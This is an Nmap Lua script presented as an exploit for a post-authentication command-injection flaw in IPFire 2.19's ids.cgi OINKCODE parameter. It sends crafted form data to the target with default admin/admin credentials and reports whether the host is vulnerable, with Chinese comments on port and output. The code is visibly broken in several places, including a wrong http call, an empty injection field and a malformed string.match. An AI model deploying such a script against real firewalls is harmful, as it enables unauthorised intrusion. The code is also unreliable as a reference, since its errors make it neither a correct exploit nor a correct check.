local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local datetime = require "vulns"

description = [[
Title :  IPFire 2.19 Firewall Post-Auth RCE
Date : 09/06/2017
exp : 0x09AL
nmap_code : d3ckx1 <d3ck@qq.com>
Tested on: IPFire 2.19 (x86_64) - Core Update 110
Vendor : http://www.ipfire.org/
Software : http://downloads.ipfire.org/releases/ipfire-2.x/2.19-core110/ipfire-2.19.x86_64-full-core110.iso
Vulnerability Description:
The file ids.cgi doesn't sanitize the OINKCODE parameter and gets passed to a system call which call wget.
You need valid credentials to exploit this vulnerability or you can exploit it through CSRF.

]]

author = "d3ckx1 <d3ck@qq.com>"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {'discovery', 'exploit', 'vuln'}

---
--@usage
-- nmap --script ipfire-2.19-vuln -p 444 <host>
--
--@output
-- 444/tcp open  IPFire 2.19 Firewall
-- |_此处为注释内容
-- |_此次应为nmap扫描的该IPFire的banner信息。

portrule = shortport.portnumber(444, 'tcp')

-- 根据自己配置的要求更改端口。

--local evildata = {'ENABLE_SNORT_GREEN:on','ENABLE_SNORT:on','RULES:registered','OINKCODE: ','ACTION: Download new ruleset','ACTION2:snort'}
--local headers = {'Accept-Encoding : gzip, deflate, br','Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','User-Agent:IPFIRE Exploit','Referer:' .. url,'Upgrade-Insecure-Requests:1'}

action = function(host, port)
  local username = "admin"
  local password = "admin"
  local url = "https://"..host.ip..":"..port.number.."/cgi-bin/ids.cgi"
  local data = {['ENABLE_SNORT_GREEN'] ='on',['ENABLE_SNORT'] = 'on',['RULES'] = 'registered',['OINKCODE'] = '',['ACTION'] = 'Download new ruleset',['ACTION2'] = 'snort'}
  local headers = {['Accept-Encoding'] = 'gzip, deflate, br',['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',['User-Agent'] = 'IPFIRE Exploit',['Referer'] = url,['Upgrade-Insecure-Requests'] = '1'}

  req = http.port (url, data, headers, username, password)


if ( req.status == 200 or string.match('uid=99(nobody'))then
  print "[+] IPFire Installation is Vulnerable [+]"

else
  print "[+] Not Vulnerable [+]"

end
end
